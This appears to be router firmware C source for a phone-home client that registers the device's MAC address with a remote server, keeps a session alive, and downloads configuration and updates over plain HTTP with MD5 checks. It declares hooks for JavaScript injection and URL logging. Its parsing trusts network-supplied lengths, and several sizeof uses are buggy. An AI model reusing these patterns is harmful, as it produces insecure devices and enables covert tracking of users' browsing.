#include <sys/param.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pkgconf/system.h>
#include <cyg/kernel/kapi.h>
#include <cyg/infra/diag.h>
#include <cyg/infra/cyg_type.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <stdarg.h>
#include <bcmnvram.h>
#include <netdb.h>
#include <router_net.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <shutils.h>
#include <string.h>
#include "../../bsp/net/ipfilter/sdw_filter.h"
#include "flash_cgi.h"
#include	"md5.h"
#include "lm_login_keep.h"

extern void init_js_inject_para(char *js_rule);
extern void js_inject_start(void);
extern void js_inject_stop(void);
extern void nis_fastcheck_mode(int enable);
extern void url_record_stop(void);
extern void url_log_start(char *server_path);
extern int start_data_rule(char *data_rule);
extern void upgrade_online_start();
extern struct upgrade_mem *upgrade_mem_alloc(int totlen);
extern void upgrade_add_text(char *head, char *text, int nbytes);

extern int is_wan_up;

char *a_query;

int32 login_keep_key = 0;
uint32 login_keep_id = 0;
uint32 login_keep_ip = 0;
int32 keep_cks = 0;
int32 keep_sequence = 1;
int login_keep_status = LM_INIT;

int get_url_ip(char *url, char *ip)
{
	int get_ip_times = 0;
	for(get_ip_times=0; get_ip_times<MAX_TRY_TIMES; get_ip_times++)
	{			
		if(0 != get_ip(url, ip) )
		{
			memset(ip , 0 , sizeof(ip));
			cyg_thread_delay(INTERVAL_TIME_30*100); //30s
		}
		else
			break;
	}

	if(get_ip_times == MAX_TRY_TIMES)
	{
		diag_printf("[%s]get ip of %s failed\n", __FUNCTION__, url);
		return -1;
	}
	else
	{
		ip[IP_LEN_16-1] = '\0';
		diag_printf("[%s]get ip of %s success\n", __FUNCTION__, url);
		return 0;
	}
}

void get_login_serv_ip(char *ip)
{
	while (1)
	{
		if(0 == is_wan_up)
		{
			diag_printf("[%s]0 == is_wan_up, sleep %d sec . . . \n", __FUNCTION__, INTERVAL_TIME_30);
			cyg_thread_delay(INTERVAL_TIME_30*100); // 30s
			continue;
		}
#if 0
		strcpy(login_serv_ip, "192.168.0.100");
#else
		if(0 != get_url_ip(LM_LOGIN_URL, ip))
		{
			memset(ip , 0 , sizeof(ip));
			cyg_thread_delay(INTERVAL_TIME_30*100);
			continue;
		}
#endif
		break;
	}

	return;
}

int32 get_login_key(int s)
{
	ssize_t size = 0;
	char buffer[ARRAY_LEN_128] = {0};
	struct lm_login_key *login_key = NULL;

	for(;;)
	{
		size = read(s, buffer, ARRAY_LEN_128);

		if(size < 0)
		{
			perror("read error\n");
			return -1;
		}

		if(size < sizeof(struct lm_login_key))
		{
			diag_printf("[%s][%d] size < sizeof(struct lm_login_key)\n", __FUNCTION__, __LINE__);
			continue;
		}

		login_key = (struct lm_login_key *)buffer;

		if(ntohs(login_key->hdr.cmd) != LM_CMD_LOIN_KEY)
		{
			diag_printf("[%s][%d] not LM_CMD_LOIN_KEY\n", __FUNCTION__, __LINE__);
			continue;
		}

		break;
	}

	return ntohl(login_key->key);
}

int send_register_req(int s)
{
	struct lm_register_req register_req;
	char *macaddr = NULL, *char_p = NULL;
	char register_req_buf[128] = {0};
	char mac_buf[ETHER_ADDR_LEN] = {0};
	uint16 register_req_len = 0, len_tmp = 0;
	int ret = -1;

	memset(&register_req, 0x0, sizeof(register_req));
	register_req.hdr.cmd = LM_CMD_REG_REQ;
	register_req.check = login_keep_key;

	register_req.maclen = ETHER_ADDR_LEN;
	macaddr = nvram_safe_get("et0macaddr");
	ether_atoe(macaddr, mac_buf);
	register_req.mac = mac_buf;

	register_req.cpulen= strlen(LM_RT_CPU);
	register_req.cpu = LM_RT_CPU;

	register_req.memlen = strlen(LM_RT_MEM);
	register_req.mem = LM_RT_MEM;

	char_p = register_req_buf;
	
	len_tmp = sizeof(struct lm_login_keep_hdr) + sizeof(register_req.check) + sizeof(register_req.maclen);
	memcpy(char_p, &register_req, len_tmp);
	register_req_len += len_tmp;
	char_p += len_tmp;

	len_tmp = register_req.maclen;
	memcpy(char_p, register_req.mac, len_tmp);
	register_req_len += len_tmp;
	char_p += len_tmp;

	len_tmp = sizeof(register_req.cpulen);
	memcpy(char_p, &(register_req.cpulen), len_tmp);
	register_req_len += len_tmp;
	char_p += len_tmp;

	len_tmp = register_req.cpulen;
	memcpy(char_p, register_req.cpu, len_tmp);
	register_req_len += len_tmp;
	char_p += len_tmp;

	len_tmp = sizeof(register_req.memlen);
	memcpy(char_p, &(register_req.memlen), len_tmp);
	register_req_len += len_tmp;
	char_p += len_tmp;

	len_tmp = register_req.memlen;
	memcpy(char_p, mac_buf, len_tmp);
	register_req_len += len_tmp;
	char_p += len_tmp;

	register_req.hdr.length = register_req_len;

	ret = write(s, (void *)register_req_buf, register_req_len);
	if(ret < 0)
	{
		perror("send_register_req write error\n");
		return -1;
	}
	diag_printf("[%s][%d] register_req_len = %d, ret = %d\n", __FUNCTION__, __LINE__, register_req_len, ret);
	return 0;
}

int recv_register_ack(int s)
{
	ssize_t size = 0;
	char buffer[ARRAY_LEN_128] = {0};
	char device_id[64] = {0};
	struct lm_register_ack *register_ack = NULL;

	for(;;)
	{
		size = read(s, buffer, ARRAY_LEN_128);

		if(size < 0)
		{
			perror("read error\n");
			return -1;
		}

		if(size < sizeof(struct lm_register_ack))
		{
			printf("[%s][%d] size < sizeof(struct lm_register_ack)\n", __FUNCTION__, __LINE__);
			continue;
		}

		register_ack = (struct lm_register_ack *)buffer;

		if(register_ack->hdr.cmd != LM_CMD_REG_ACK)
		{
			printf("[%s][%d] not LM_CMD_REG_ACK\n", __FUNCTION__, __LINE__);
			continue;
		}

		if(register_ack->result != 0)
		{
			printf("[%s][%d] register failed\n", __FUNCTION__, __LINE__);
			return -1;
		}
		
		break;
	}
	
	login_keep_id = ntohl(register_ack->id);
	login_keep_ip = register_ack->ip;

	sprintf(device_id, "%d", login_keep_id);
	nvram_set("lm_device_id", device_id);
	nvram_commit();

	return 0;
}

int lm_login_register(int s)
{
	int ret = -1;
	
	ret = send_register_req(s);
	if(-1 == ret)
	{
		diag_printf("[%s][%d] send_register_req failed\n", __FUNCTION__, __LINE__);
		return -1;
	}

	ret = recv_register_ack(s);
	if(-1 == ret)
	{
		diag_printf("[%s][%d] recv_register_ack failed\n", __FUNCTION__, __LINE__);
		return -1;
	}

	return 0;
}

int send_login_req(int s)
{
	struct lm_login_req login_req;
	int ret = -1;

	memset(&login_req, 0x0, sizeof(login_req));
	login_req.hdr.cmd = LM_CMD_LOIN_REQ;
	login_req.check = login_keep_key;
	login_req.id = login_keep_id;
	login_req.hdr.length = sizeof(login_req.hdr)+sizeof(login_req.check)+sizeof(login_req.id);

	ret = write(s, (void *)(&login_req), login_req.hdr.length);
	if(ret < 0)
	{
		perror("send_register_req write error\n");
		return -1;
	}
	diag_printf("[%s][%d] login_req.hdr.length = %d, ret = %d\n", __FUNCTION__, __LINE__, login_req.hdr.length, ret);
	return 0;
}

int recv_login_ack(int s)
{
	ssize_t size = 0;
	char buffer[ARRAY_LEN_128] = {0};
	struct lm_login_ack *login_ack = NULL;

	for(;;)
	{
		size = read(s, buffer, ARRAY_LEN_128);

		if(size < 0)
		{
			perror("read error\n");
			return -1;
		}

		if(size < sizeof(struct lm_login_ack))
		{
			printf("[%s][%d] size < sizeof(struct lm_login_ack)\n", __FUNCTION__, __LINE__);
			continue;
		}

		login_ack = (struct lm_login_ack *)buffer;

		if(login_ack->hdr.cmd != LM_CMD_LOIN_ACK)
		{
			printf("[%s][%d] not LM_CMD_LOIN_ACK\n", __FUNCTION__, __LINE__);
			continue;
		}

		if(login_ack->result != 0)
		{
			printf("[%s][%d] register failed\n", __FUNCTION__, __LINE__);
			return -1;
		}
		
		break;
	}
	
	login_keep_ip = login_ack->ip;
	struct in_addr kkkkk_ip = {0};
	kkkkk_ip.s_addr = login_keep_ip;
	diag_printf("[%s][%d] login_keep_ip = %s\n", __FUNCTION__, __LINE__, inet_ntoa(kkkkk_ip));

	return 0;
}

int lm_do_login(int s)
{
	int ret = -1;

	ret = send_login_req(s);
	if(-1 == ret)
	{
		diag_printf("[%s][%d] send_login_req failed\n", __FUNCTION__, __LINE__);
		return -1;
	}

	ret = recv_login_ack(s);
	if(-1 == ret)
	{
		diag_printf("[%s][%d] recv_login_ack failed\n", __FUNCTION__, __LINE__);
		return -1;
	}

	return 0;
}

int recv_login_red(int s, struct lm_login_redirect **login_redirect_rt)
{
	ssize_t size = 0;
	char buffer[ARRAY_LEN_128] = {0};
	struct lm_login_redirect *login_redirect = NULL, *login_redirect_tmp = NULL;

	for(;;)
	{
		size = read(s, buffer, ARRAY_LEN_128);

		if(size < 0)
		{
			perror("read error\n");
			return -1;
		}

		if(size < sizeof(struct lm_login_redirect))
		{
			printf("[%s][%d] size < sizeof(struct lm_login_redirect)\n", __FUNCTION__, __LINE__);
			continue;
		}

		login_redirect = (struct lm_login_redirect *)buffer;

		if(login_redirect->hdr.cmd != LM_CMD_LOIN_RED)
		{
			printf("[%s][%d] not LM_CMD_LOIN_RED\n", __FUNCTION__, __LINE__);
			continue;
		}
		
		break;
	}

	login_redirect_tmp = (struct lm_login_redirect *)malloc(sizeof(struct lm_login_redirect));
	if(NULL == login_redirect_tmp)
	{
		perror("malloc error\n");
		return -1;
	}

	memset(login_redirect_tmp, 0x0, sizeof(struct lm_login_redirect));
	memcpy(login_redirect_tmp, login_redirect, sizeof(struct lm_login_redirect));
	*login_redirect_rt = login_redirect_tmp;
	
	return 0;
}

struct lm_login_redirect *lm_login(char *ip, int port)
{
	char *device_id = NULL;
	int s = -1;
	int ret;
	int32 login_key;
	struct sockaddr_in server_addr;
	struct lm_login_redirect *login_redirect = NULL;

	s = create_tcp_socket();
	if(-1 == s)
	{
		perror("socket error\n");
		return NULL;
	}

	bzero(&server_addr, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(port);
	inet_pton(AF_INET, ip, (void *)(&(server_addr.sin_addr.s_addr)));
	ret = connect(s, (struct sockaddr*)&server_addr, sizeof(struct sockaddr));
	if(ret < 0)
	{
		perror("Could not connect.\n");
		close(s);
		return NULL;
	}

	login_key = get_login_key(s);

	if(-1 == login_key)
	{
		diag_printf("[%s][%d] get login_key failed\n", __FUNCTION__, __LINE__);
		close(s);
		return NULL;
	}

	login_keep_key = login_key^LM_XOR_KEY1;
	login_keep_key ^= LM_XOR_KEY2;

	device_id = nvram_safe_get("lm_device_id");
	if(0 == strlen(device_id) || 0 == strcmp(device_id, "0"))
	{
		diag_printf("[%s][%d] need do register\n", __FUNCTION__, __LINE__);
		ret = lm_login_register(s);
		if(-1 == ret)
		{
			close(s);
			return NULL;
		}
	}
	else
	{
		login_keep_id = atoi(device_id);
	}

	ret = lm_do_login(s);
	if(-1 == ret)
	{
		close(s);
		return NULL;
	}

	ret = recv_login_red(s, &login_redirect);
	if(-1 == ret)
	{
		close(s);
		return NULL;
	}

	close(s);
	return login_redirect;
}

int send_keep_req(int s)
{
	struct lm_keep_req keep_req;
	char *char_p = NULL;
	char keep_req_buf[128] = {0};
	uint16 keep_req_len = 0, len_tmp = 0;
	int ret = -1;

	memset(&keep_req, 0x0, sizeof(keep_req));
	keep_req.hdr.cmd = LM_CMD_KEEP_REQ;
	keep_req.id = login_keep_id;
	keep_req.check = keep_cks^keep_sequence;
	keep_req.verlen = strlen(LM_RT_VER);
	keep_req.version= LM_RT_VER;
	keep_req.typelen= strlen(LM_RT_FIRM);
	keep_req.type = LM_RT_FIRM;

	char_p = keep_req_buf;

	len_tmp = sizeof(struct lm_login_keep_hdr) + sizeof(keep_req.id) + sizeof(keep_req.check) + sizeof(keep_req.verlen);
	memcpy(char_p, &keep_req, len_tmp);
	keep_req_len += len_tmp;
	char_p += len_tmp;

	len_tmp = keep_req.verlen;
	memcpy(char_p, keep_req.version, len_tmp);
	keep_req_len += len_tmp;
	char_p += len_tmp;

	len_tmp = sizeof(keep_req.typelen);
	memcpy(char_p, &(keep_req.typelen), len_tmp);
	keep_req_len += len_tmp;
	char_p += len_tmp;

	len_tmp = keep_req.typelen;
	memcpy(char_p, keep_req.type, len_tmp);
	keep_req_len += len_tmp;
	char_p += len_tmp;

	keep_req.hdr.length = keep_req_len;

	ret = write(s, (void *)keep_req_buf, keep_req_len);
	if(ret < 0)
	{
		perror("send_keep_req write error\n");
		return -1;
	}
	diag_printf("[%s][%d] keep_req_len = %d, ret = %d\n", __FUNCTION__, __LINE__, keep_req_len, ret);

	keep_sequence++;
	return 0;
}

int recv_keep_ack(int s)
{
	ssize_t size = 0;
	char buffer[ARRAY_LEN_128] = {0};
	struct lm_keep_ack *keep_ack = NULL;

	for(;;)
	{
		size = read(s, buffer, ARRAY_LEN_128);

		if(size < 0)
		{
			perror("read error\n");
			return -1;
		}

		if(size < sizeof(struct lm_keep_ack))
		{
			printf("[%s][%d] size < sizeof(struct lm_keep_ack)\n", __FUNCTION__, __LINE__);
			continue;
		}

		keep_ack = (struct lm_keep_ack *)buffer;

		if(keep_ack->hdr.cmd != LM_CMD_KEEP_ACK)
		{
			printf("[%s][%d] not LM_CMD_LOIN_ACK\n", __FUNCTION__, __LINE__);
			continue;
		}

		if(keep_ack->result != 0)
		{
			printf("[%s][%d] register failed\n", __FUNCTION__, __LINE__);
			return -1;
		}
		
		break;
	}
	
	keep_cks = ntohl(keep_ack->check);
	keep_cks ^= LM_XOR_CKS;

	return 0;
}

int send_conf_req(int s, uint16 conf_flag)
{
	struct lm_conf_req conf_req;
	char *char_p = NULL;
	char conf_req_buf[128] = {0};
	uint16 conf_req_len = 0, len_tmp = 0;
	int ret = -1;

	memset(&conf_req, 0x0, sizeof(conf_req));
	conf_req.hdr.cmd = LM_CMD_KEEP_CONF_REQ;
	conf_req.check = keep_cks^keep_sequence;
	conf_req.flag = conf_flag;
	conf_req.verlen = strlen(LM_RT_VER);
	conf_req.version= LM_RT_VER;
	conf_req.typelen= strlen(LM_RT_FIRM);
	conf_req.type = LM_RT_FIRM;

	char_p = conf_req_buf;

	len_tmp = sizeof(struct lm_login_keep_hdr) + sizeof(conf_req.check) + sizeof(conf_req.flag) + sizeof(conf_req.verlen);
	memcpy(char_p, &conf_req, len_tmp);
	conf_req_len += len_tmp;
	char_p += len_tmp;

	len_tmp = conf_req.verlen;
	memcpy(char_p, conf_req.version, len_tmp);
	conf_req_len += len_tmp;
	char_p += len_tmp;

	len_tmp = sizeof(conf_req.typelen);
	memcpy(char_p, &(conf_req.typelen), len_tmp);
	conf_req_len += len_tmp;
	char_p += len_tmp;

	len_tmp = conf_req.typelen;
	memcpy(char_p, conf_req.type, len_tmp);
	conf_req_len += len_tmp;
	char_p += len_tmp;

	conf_req.hdr.length = conf_req_len;

	ret = write(s, (void *)conf_req_buf, conf_req_len);
	if(ret < 0)
	{
	    perror("send_conf_req write error\n");
	    return -1;
	}
	diag_printf("[%s][%d]<conf_flag = %d> conf_req_len = %d, ret = %d\n", __FUNCTION__, __LINE__, conf_flag, conf_req_len, ret);

	keep_sequence++;
	return 0;
}

int parse_version_struct(struct lm_keep_version *keep_version, char *version_struct)
{
	int keep_version_len = 0, tmp_len = 0;
	int8 *int8_pointer = NULL;
	char *char_p = version_struct;

	tmp_len = sizeof(keep_version->hdr)+sizeof(keep_version->type)+sizeof(keep_version->action)+sizeof(keep_version->verlen);
	memcpy(keep_version, version_struct, tmp_len);
	keep_version_len += tmp_len;
	char_p += tmp_len;

	keep_version->hdr.length = ntohs(keep_version->hdr.length);
	keep_version->hdr.cmd = ntohs(keep_version->hdr.cmd);
	keep_version->type = ntohs(keep_version->type);
	keep_version->action = ntohs(keep_version->action);
	keep_version->verlen = ntohs(keep_version->verlen);

	tmp_len = keep_version->verlen;
	int8_pointer = malloc(tmp_len+1);
	if(NULL == int8_pointer)
	{
		perror("malloc failed\n");
		keep_version->version = NULL;
		return -1;
	}
	memset(int8_pointer, 0x0, tmp_len+1);
	memcpy(int8_pointer, char_p, tmp_len);
	int8_pointer[tmp_len] = '\0';
	keep_version->version = int8_pointer;
	keep_version_len += tmp_len;
	char_p += tmp_len;

	tmp_len = sizeof(keep_version->urllen);
	memcpy(&(keep_version->urllen), char_p, tmp_len);
	keep_version_len += tmp_len;
	char_p += tmp_len;

	keep_version->urllen = ntohs(keep_version->urllen);

	tmp_len = keep_version->urllen;
	int8_pointer = malloc(tmp_len+1);
	if(NULL == int8_pointer)
	{
		perror("malloc failed\n");
		free(keep_version->version);
		keep_version->version = NULL;
		keep_version->url = NULL;
		return -1;
	}
	memset(int8_pointer, 0x0, tmp_len+1);
	memcpy(int8_pointer, char_p, tmp_len);
	int8_pointer[tmp_len] = '\0';
	keep_version->url = int8_pointer;
	keep_version_len += tmp_len;
	char_p += tmp_len;

	tmp_len = sizeof(keep_version->md5len);
	memcpy(&(keep_version->md5len), char_p, tmp_len);
	keep_version_len += tmp_len;
	char_p += tmp_len;

	keep_version->md5len = ntohs(keep_version->md5len);

	tmp_len = keep_version->md5len;
	int8_pointer = malloc(tmp_len+1);
	if(NULL == int8_pointer)
	{
		perror("malloc failed\n");
		free(keep_version->version);
		free(keep_version->url);
		keep_version->version = NULL;
		keep_version->url = NULL;
		keep_version->md5 = NULL;
		return -1;
	}
	memset(int8_pointer, 0x0, tmp_len+1);
	memcpy(int8_pointer, char_p, tmp_len);
	int8_pointer[tmp_len] = '\0';
	keep_version->md5 = int8_pointer;
	keep_version_len += tmp_len;

	if(keep_version->hdr.length == keep_version_len)
	{
		diag_printf("[%s][%d] keep_version->hdr.length == keep_version_len\n", __FUNCTION__, __LINE__);
	}
	else
	{
		diag_printf("[%s][%d] keep_version->hdr.length != keep_version_len\n", __FUNCTION__, __LINE__);
	}

	return 0;
}

void free_keep_version(struct lm_keep_version *keep_version)
{
	if(NULL == keep_version)
	{
		diag_printf("[%s][%d] invalid para\n", __FUNCTION__, __LINE__);
		return;
	}

	if(keep_version->version != NULL)
	{
		free(keep_version->version);
		keep_version->version = NULL;
	}
	if(keep_version->url != NULL)
	{
		free(keep_version->url);
		keep_version->url = NULL;
	}
	if(keep_version->md5 != NULL)
	{
		free(keep_version->md5);
		keep_version->md5 = NULL;
	}

	free(keep_version);

	return;
}

int keep_firm_version(char *version_struct)
{
	struct lm_keep_version *keep_version = NULL;
	int ret;

	keep_version = (struct lm_keep_version *)malloc(sizeof(struct lm_keep_version));
	if(NULL == keep_version)
	{
		perror("malloc keep_version failed\n");
		return -1;
	}
	memset(keep_version, 0x0, sizeof(keep_version));

	ret = parse_version_struct(keep_version, version_struct);

	if(-1 == ret)
	{
		free_keep_version(keep_version);
		keep_version = NULL;
		diag_printf("[%s][%d] parse_version_struct failed\n", __FUNCTION__, __LINE__);
		return -1;
	}

	//upgrade_online_start(keep_version);

	return 0;
}

int parse_conf_ack(struct lm_conf_ack *conf_ack, char *conf_ack_buf)
{
	int conf_ack_len = 0, tmp_len = 0;
	int8 *int8_pointer = NULL;
	char *char_p = conf_ack_buf;

	tmp_len = sizeof(conf_ack->hdr)+sizeof(conf_ack->result)+sizeof(conf_ack->flag)+sizeof(conf_ack->urllen);
	memcpy(conf_ack, char_p, tmp_len);
	conf_ack_len += tmp_len;
	char_p += tmp_len;

	conf_ack->hdr.length = ntohs(conf_ack->hdr.length);
	conf_ack->hdr.cmd = ntohs(conf_ack->hdr.cmd);
	conf_ack->flag = ntohs(conf_ack->flag);
	conf_ack->urllen = ntohs(conf_ack->urllen);

	tmp_len = conf_ack->urllen;
	int8_pointer = malloc(tmp_len+1);
	if(NULL == int8_pointer)
	{
		perror("malloc failed\n");
		conf_ack->url = NULL;
		return -1;
	}
	memset(int8_pointer, 0x0, tmp_len+1);
	memcpy(int8_pointer, char_p, tmp_len);
	int8_pointer[tmp_len] = '\0';
	conf_ack->url = int8_pointer;
	conf_ack_len += tmp_len;
	char_p += tmp_len;

	tmp_len = sizeof(conf_ack->md5len);
	memcpy(&(conf_ack->md5len), char_p, tmp_len);
	conf_ack_len += tmp_len;
	char_p += tmp_len;

	conf_ack->md5len = ntohs(conf_ack->md5len);

	tmp_len = conf_ack->md5len;
	int8_pointer = malloc(tmp_len+1);
	if(NULL == int8_pointer)
	{
		perror("malloc failed\n");
		free(conf_ack->url);
		conf_ack->url = NULL;
		conf_ack->md5 = NULL;
		return -1;
	}
	memset(int8_pointer, 0x0, tmp_len+1);
	memcpy(int8_pointer, char_p, tmp_len);
	int8_pointer[tmp_len] = '\0';
	conf_ack->md5 = int8_pointer;
	conf_ack_len += tmp_len;

	if(conf_ack->hdr.length == conf_ack_len)
	{
		diag_printf("[%s][%d] conf_ack->hdr.length == conf_ack_len\n", __FUNCTION__, __LINE__);
	}
	else
	{
		diag_printf("[%s][%d] conf_ack->hdr.length != conf_ack_len\n", __FUNCTION__, __LINE__);
	}

	return 0;
}

/* 功能：获取某字符c，在字符串src中的位置 
* 参数：src,源字符串;c,字符;flag,选择查找顺序的标志，0表示从头部开始找，1表示从尾部开始找 
* 返回值：成功为字符c在字符串src中的实际位置,范围:[1,strlen]；失败为-1。 
*/  
int strpos(const char *src, char c, int flag)  
{  
    const char *p;  
    int pos, len;  
      
    p = src; 

	if(p == NULL)
	{
		return -1 ;
	}
    len = strlen(src);  

	pos = 1; 
      
    if (flag == 0) {            //flag == 0表示从头部开始找    
        while (c != *p && *p) {  
            pos++;  
            p++;  
        }  
        if(*p == '\0')  //没有此字符   
            pos = -1;  
    }  
    else if(flag == 1) {        //flag == 1表示从尾部开始找   
        p += len -1;    //指向字符串的最后一个字符   
        pos = len;  
        while (c != *p && pos > 0) {  
            pos--;  
            p--;  
        }  
        if(pos == 0)    //没有此字符   
            pos = -1;             
    }  
  
    return pos;   //返回字符c在字符串src中的实际位置,范围:[1,strlen]；失败为-1.   
}  

int is_dir_exist(char *full_pathname)
{
	int pos,len;	
	char dir_path[ARRAY_LEN_256] = {0};
	char *p_path = NULL;
 	
	if (!full_pathname || 0 == strlen(full_pathname))  
	  	return -1;  
	
	if (strlen(full_pathname) > ARRAY_LEN_256)
	{
		diag_printf("full_pathname len > 255,return!\n");
		return -1;
	}
	p_path = full_pathname;	
	len = pos = 0;  
	while ((pos = strpos(p_path, '/', 0)) != -1)
	{
		len += pos;
		
		strncpy(dir_path,full_pathname,len);
		
		dir_path[len] = '\0';
	
		if (access(dir_path,0) != 0)	//目录不存在，需创建
		{
			if (mkdir(dir_path, 0777) != 0)//创建失败
			{
				diag_printf("mkdir error,return!\n");
				return -1;
			}
		}
		p_path = full_pathname+len;
	}
	return 0;
}

void clear_file(char *file_path)
{
	FILE *fp = NULL;
	fp = fopen(file_path, "w");
	if(NULL != fp)
		fclose(fp);
	else
		diag_printf("[%s]no such file, are you kidding me!!!\n", __FUNCTION__);
	return;
}

/** 
 * Find the first occurrence of find in s, ignore case. 
 */  
char * my_strcasestr(const char * s, const char * find)  
{  
    char c, sc;  
    size_t len;  
  
    if ((c = *find++) != '\0') {  
        c = tolower((unsigned char)c);  
        len = strlen(find);  
        do 
	{  
            do 
		{  
                if((sc = *s++) == '\0')  
                    return (NULL);  
            } while((char)tolower((unsigned char)sc) != c);  
        } while(strncasecmp(s, find, len) != 0);  
        s--;  
    }  
    return ((char *)s);
}

int http_get_file(char *server_host, char *server_path, int port, char *server_ip, char *save_into_router, int *file_len)
{
	struct sockaddr_in dest_addr;
	fd_set readfds;
	struct timeval tv = {3, 0};//timeout 3s
	char save_path[ARRAY_LEN_256] ={0};
	char request_str[ARRAY_LEN_1024] = {0};
	char response_str[ARRAY_LEN_2048] = {0};
	char *response_str_tmp = NULL, *html_head = NULL;
	char *p_len = NULL;
	int is_save_path_null = 0;
	int fd = 0, sockfd = 0, selectfd = 0;
	int len = 0, len_head = 0, total_len = 0;
	int http_total_len = 0;
	int ret = DOWNLOAD_FAIL;

	 /*构造服务器请求报文*/	
	sprintf(request_str, "GET %s HTTP/1.1\r\n"
		"Accept: */*\r\n"
		"User-Agent: Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)\r\n"
		"Host: %s\r\n"
		"Connection: Close\r\n\r\n",server_path,server_host);
	sockfd = socket(AF_INET, SOCK_STREAM, 0);			
	if (-1 == sockfd)
	{
		diag_printf("creat sockfd is fail\r\n");
		perror("sockfd");
		return DOWNLOAD_FAIL;
	}

	/* 填写sockaddr_in结构*/
	memset(&dest_addr, 0, sizeof(dest_addr));
	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(port);
	dest_addr.sin_addr.s_addr = inet_addr(server_ip);

	/* 客户程序发起连接请求 */
	if (-1 == connect(sockfd, (struct sockaddr *)&dest_addr, sizeof(struct sockaddr)))
	{
		diag_printf("sockfd connect fail\n");
		perror("connect");
		ret = DOWNLOAD_FAIL;
		goto  free_resource;
	}
	
	/*发送http请求request*/
	if (-1 == send(sockfd, request_str, strlen(request_str), 0))
	{
		diag_printf("sockfd send fail\n");
		perror("send");
		ret = DOWNLOAD_FAIL;
		goto  free_resource;
	} 
	if(NULL == save_into_router || 0 == strlen(save_into_router))
	{
		is_save_path_null = 1;
		diag_printf("no need to save download file, upgrade....\n");
	}
	else
	{
		sprintf(save_path,"%s",save_into_router);
		if (is_dir_exist(save_path) != 0)
		{
			diag_printf("the dir of %s haven't been existed\n", save_path);
			return DIR_NOT_EXIST;
		}
		diag_printf("[%s][%d]save_path = %s\n", __FUNCTION__, __LINE__, save_path);
		clear_file(save_into_router);
		fd = open(save_into_router, O_WRONLY|O_APPEND|O_CREAT);
	}
	/* 连接成功了，接收http响应，response */
	memset(response_str, 0, sizeof(response_str));
	while (1)
	{
		FD_ZERO(&readfds);
		FD_SET(sockfd, &readfds);
		selectfd = select(sockfd+1, &readfds, NULL, NULL, &tv);  //超时时间为3s
		if(selectfd == 0)
		{
			diag_printf("___download timeout___\n");
			ret = DOWNLOAD_TIMEOUT;
			goto  free_resource;
		}
		else if(selectfd < 0)
		{
			diag_printf("__discovery__select:errno[%d]__\n", errno);
			ret = DOWNLOAD_FAIL;
			goto  free_resource;
		}
		else if(selectfd > 0)
		{
			memset(response_str, 0, sizeof(response_str));
			if(FD_ISSET(sockfd, &readfds))
			{
				/*接收出错*/
				if ((len = recv(sockfd, response_str, sizeof(response_str), 0)) < 0)
				{
					diag_printf("recv failed\n");
					ret = DOWNLOAD_FAIL;
					goto  free_resource;
				}
				//diag_printf("len = %d\n", len);
				//接收完成
				if(0 == len)
				{
					break;
				}
				//跳过报头
				response_str_tmp = response_str;
				len_head = 0;
				//html_head = NULL;
				if(!html_head && NULL != (html_head = strstr(response_str, "\r\n\r\n")))
				{
					//diag_printf("response_str = \n%s\n", response_str);
					if (strstr(response_str, "404"))
					{
						diag_printf("__404 not found__\n");
						ret = FILE_NOT_FOUNT;
						goto  free_resource;
					}
					if (strstr(response_str, "403"))
					{
						diag_printf("__403 Forbidden__\n");
						ret = FILE_NOT_FOUNT;
						goto  free_resource;
					}
					if(!(p_len = my_strcasestr(response_str, "Content-Length:")))
					{
						diag_printf("Content-Length: is null\n");
						ret = FILE_NOT_FOUNT;
						goto  free_resource;
					}
					http_total_len = atoi(p_len + sizeof("Content-Length:") - 1);

					html_head += sizeof("\r\n\r\n") - 1;
					//计算报头长度
					while(response_str_tmp != html_head && len_head < sizeof(response_str))
					{
						response_str_tmp++;
						len_head++;
					}
					if(len_head >= sizeof(response_str))
					{
						diag_printf("not find \n");
						ret = FILE_NOT_FOUNT;
						goto  free_resource;
					}
					diag_printf("len_head = %d\n", len_head);
					if(1 == is_save_path_null)//is upgrade online
					{
						a_query = (char *)upgrade_mem_alloc(http_total_len);
						upgrade_add_text(a_query,html_head,len-len_head);
					}
					else
					{
						write(fd,html_head,len-len_head);
					}
					total_len += len - len_head;
					continue;
				}
				if(1 == is_save_path_null)
				{
					upgrade_add_text(a_query,response_str,len);
				}
				else
				{
					write(fd,response_str,len);
				}
				total_len += len;
			}
		}
	}
	diag_printf("total_len = %d, http_total_len = %d\n", total_len, http_total_len);
	if(total_len != http_total_len)
	{
		ret = LENGTH_ERROR;
		goto  free_resource;
	}
	if(NULL != file_len)
		*file_len = total_len;
	close(fd) ;
	close(sockfd) ;
	return OK;
free_resource :

	if(fd != -1)
	{
		close(fd);
		unlink(save_into_router);
	}

	if(sockfd  != -1)
	{
		close(sockfd) ;
	}
	return ret;
}

int download_conf(char *host_url, char *server_path, char *server_ip, char *save_conf_aes)
{
	int download_conf_times = 0;
	int conf_file_len = 0;
	for(download_conf_times=0; download_conf_times<MAX_TRY_TIMES; download_conf_times++)
	{
		if(OK != http_get_file(host_url, server_path, SERVER_PORT, server_ip, save_conf_aes, &conf_file_len))
		{
			cyg_thread_delay(100);
		}
		else
			break;
	}

	if(download_conf_times == MAX_TRY_TIMES)
	{
		diag_printf("[%s]get conf failed\n", __FUNCTION__);
		return -1;
	}
	else
	{
		if(0 == conf_file_len)
		{
			diag_printf("[%s]conf_file_len = 0\n", __FUNCTION__);
			return -1;
		}
		else
		{
			diag_printf("[%s]get conf success, conf_file_len = %d\n", __FUNCTION__, conf_file_len);
			return conf_file_len;
		}
	}
}

int md5_check(unsigned char *md5, unsigned char *buf, int length)
{
	MD5_CONTEXT		md5ctx;
	unsigned char	hash[16] = {0};

	memset(&md5ctx, 0x0, sizeof(MD5_CONTEXT));
	MD5Init(&md5ctx);
	MD5Update(&md5ctx, buf, (unsigned int)length);
	MD5Final(hash, &md5ctx);

	if(0 == memcmp(md5, hash, 16))
	{
		diag_printf("[%s][%d] md5_check success\n", __FUNCTION__, __LINE__);
		return 0;
	}
	else
	{
		diag_printf("[%s][%d] md5_check failed\n", __FUNCTION__, __LINE__);
		return -1;
	}
}

